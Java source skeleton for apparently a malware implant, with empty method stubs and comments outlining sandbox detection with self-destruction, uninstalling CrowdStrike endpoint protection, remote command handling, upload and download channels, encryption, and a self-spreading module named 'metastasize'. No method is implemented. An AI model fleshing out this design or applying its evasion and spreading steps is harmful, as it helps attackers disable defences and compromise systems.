import java.lang.reflect.Method;
import java.util.Hashtable;
import org.w3c.dom.Document;

import javax.crypto.SecretKey;

public class nCore
{
    public static void Main(String[] args)
    {
        // convert to thread once main loop has been tested

        //check if the program can reach out and if it's in a sandbox
        if (!keepalive() || countermeasures.chkSandbox())
        {
            countermeasures.spoliate();
        }

        //check if crowdstrike is installed and attempt uninstall if it is
        if (countermeasures.getCStrike())
        {
            countermeasures.counterStrike();
        }

        //execute initial 
    }

    public static boolean keepalive()
    {

    }

    public static void react()
    {
        //exec method, uses threader, loops to keepalive
        // 1. recv cmd
        // 2. modsearch
        // 3. thread mod if extant
    }

    public static void threader()
    {

    }

    //need class getter

    class modLib
    {
        public class autoLib
        {
            private static Document metastasize()
            {
                // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
            }

            class cancer
            {
                //currently empty, populated when modules updated
            }
        }

        private class genLib
        {
            private static Document metadata()
            {
                
            }
        }

        private class interLib
        {

        } 

        private class nixLib
        {

        }

        private class winLib
        {

        }


    } 

    private class util
    {
        private static Hashtable getEnv()
        {

        }

        private static Method getMethodByName(String methodName)
        {
            
        }

        private static Class getCLassByName(String className)
        {

        }
    }

    private class net
    {
        private byte[] request()
        {

        }

        private Hashtable kaReq(String data)
        {
            //returns formatted data for a keepalive request

        }

        private Hashtable upReq(String data)
        {
            //returns formatted data for an upload request
        }

        private Hashtable dnReq(String data)
        {
            //returns formatted data for a download request
        }

        
    }

    private class security
    {
        private static byte[] encrypt()
        {

        }

        private static byte[] decrypt()
        {

        }

        private static SecretKey init() throws Exception
        {
    
        }
    
        private byte[] doWork(byte[] plaintext, byte[] nonce, int mode) throws Exception
        {

        }
    }

    private class countermeasures
    {
        private static boolean chkSandbox()
        {

        }

        private static void spoliate()
        {

        }

        private static void counterStrike()
        {

        }

        private static boolean getCStrike()
        {

        }
    }
}
